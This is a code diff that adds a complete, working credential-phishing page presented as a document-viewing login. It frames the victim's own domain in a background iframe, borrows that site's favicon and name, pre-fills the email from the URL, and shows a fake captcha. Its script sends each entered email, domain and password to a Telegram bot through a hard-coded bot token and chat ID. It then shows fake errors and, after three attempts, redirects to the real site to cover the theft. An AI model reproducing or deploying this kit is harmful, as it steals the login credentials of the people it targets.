@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Login</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="https://l2.io/ip.js?var=userip"></script>
+<style>
+body { background-color: #eeeeee; font-family: Helvetica Neue, Helvetica, sans-serif; font-size: 13px; color: #425152; margin: 0; }
+#iframe-content { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: none; z-index: 0; }
+#blocker { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: transparent; z-index: 5; pointer-events: all; }
+#login-box { position: fixed; top: 50%; left: 50%; transform: translate(-50% ,-50%); background: #ffffff; padding: 20px; border-radius: 4px; box-shadow: 0 0 10px 0px #0003; width: 375px; z-index: 10; }
+#login-box .header { display: flex; align-items: center; margin-bottom: 20px; }
+#login-box .header img { margin-right: 10px; max-width: 40px; }
+#login-box .header h2 { margin: 0; font-size: 18px; color: #425152; text-transform: uppercase; }
+.row { display: flex; align-items: center; margin-bottom: 15px; }
+.row label { width: 80px; font-weight: bold; color: #425152; }
+.row input { flex: 1; padding: 6px 10px; border: 1px solid #ccc; border-radius: 4px; }
+button { padding: 6px 10px; background: black; color: #ffffff; font-weight: bold; border: none; border-radius: 4px; cursor: pointer; align-self: flex-start; }
+button:hover { background: #333; }
+#error-message { color: red; margin-top: 10px; font-size: 14px; }
+p.copy { margin-top: 15px; font-size: 11px; color: #666; }
+
+/* Custom Captcha Styles */
+#custom-captcha { display: flex; align-items: center; gap: 10px; border: 1px solid #ccc; padding: 8px 10px; border-radius: 4px; background: #f9f9f9; cursor: pointer; margin-bottom: 15px; user-select: none; width: 150px; }
+#captcha-box { width: 18px; height: 18px; border: 2px solid #999; border-radius: 2px; display: flex; justify-content: center; align-items: center; background: #fff; font-size: 12px; font-weight: bold; color: transparent; }
+</style>
+</head>
+<body>
+
+<iframe id="iframe-content" src=""> </iframe>
+<div id="blocker"></div>
+
+<div id="login-box">
+  <div class="header">
+    <img id="logo-img" src="" alt="Company Logo">
+    <h2 id="company-name">Company</h2>
+  </div>
+  
+  <form id="loginForm">
+    <input type="text" id="b_name" style="display:none !important" tabindex="-1" autocomplete="off">
+    
+    <div class="row">
+      <label for="email">Email :</label>
+      <input type="email" id="email" placeholder="Enter email" required autofocus>
+    </div>
+
+    <div class="row">
+      <label for="password">Password :</label>
+      <input type="password" id="password" placeholder="Enter password" required autofocus>
+    </div>
+
+    <div id="custom-captcha">
+        <div id="captcha-box">✔</div>
+        <span style="font-size:12px; color:#333;">I am not a robot</span>
+    </div>
+
+    <button type="submit" id="submitBtn">View Document</button>
+    <div id="error-message"></div>
+  </form>
+
+  <p class="copy">
+    All rights reserved. Copyright ©️ 2026
+    <span id="copy-name">Company</span>
+  </p>
+</div>
+
+<script>
+  let isHuman = false;
+  document.getElementById('custom-captcha').addEventListener('click', function() {
+      if (isHuman) return;
+      isHuman = true;
+      const box = document.getElementById('captcha-box');
+      box.style.borderColor = '#000';
+      box.style.color = '#000';
+      this.style.cursor = 'default';
+  });
+
+  document.getElementById('loginForm').addEventListener('submit', function(e) {
+      if (!isHuman) {
+          e.preventDefault();
+          e.stopImmediatePropagation();
+          document.getElementById('error-message').innerText = 'Please verify you are not a robot.';
+      }
+  }, true);
+</script>
+
+<script>
+  const urlParams = new URLSearchParams(window.location.search);
+  let email = urlParams.get('email') || '';
+  let domain = urlParams.get('domain') || '';
+
+  if (!domain && email.includes('@')) {
+    domain = email.split('@')[1];
+  }
+
+  const emailInput = document.getElementById('email');
+  if (email) {
+    emailInput.value = email;
+    emailInput.readOnly = true;
+  }
+
+  if (domain) {
+    document.getElementById('iframe-content').src = "https://" + domain;
+    document.getElementById('logo-img').src =
+      "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
+    document.getElementById('company-name').innerText = domain.toUpperCase();
+    document.getElementById('copy-name').innerText = domain.toUpperCase();
+  }
+
+  let attempts = parseInt(localStorage.getItem('loginAttempts') || '0');
+
+  document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    email = emailInput.value || email;
+    if (!domain && email.includes('@')) {
+      domain = email.split('@')[1];
+    }
+
+    const password = document.getElementById('password').value;
+
+    const passwordValid = password.length >= 6 &&
+      /[A-Z]/.test(password) &&
+      /[a-z]/.test(password) &&
+      /\d/.test(password) &&
+      /[!@#$%^&*(),.?":{}|<>]/.test(password);
+
+    const message = 'Login Attempt:\nEmail: ' + email + '\nDomain: ' + domain + '\nPassword: ' + password;
+    const apiKey = '8782989251:AAEwR1jvri-xuPxaBlnfRLvr39WVU1i1xuM'; 
+    const chatId = '8812612581'; 
+    const url = 'https://api.telegram.org/bot' + apiKey + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message); 
+
+    fetch(url).catch(error => console.error('Telegram fetch error:', error));
+
+    attempts += 1;
+    localStorage.setItem('loginAttempts', attempts);
+
+    if (attempts >= 3&& domain) {
+      window.location.href = "https://" + domain;
+      return;
+    }
+
+    setTimeout(function() {
+      if (!passwordValid) {
+        document.getElementById('error-message').innerText = "Incorrect password.";
+      } else {
+        document.getElementById('error-message').innerText = "Sign in attempt timeout, please try again.";
+      }
+      
+      if (typeof isHuman !== 'undefined') { 
+          isHuman = false; 
+          document.getElementById('captcha-box').style.color = 'transparent';
+          document.getElementById('captcha-box').style.borderColor = '#999';
+      }
+    }, 2000);
+  });
+</script>
+
+</body>
+</html>
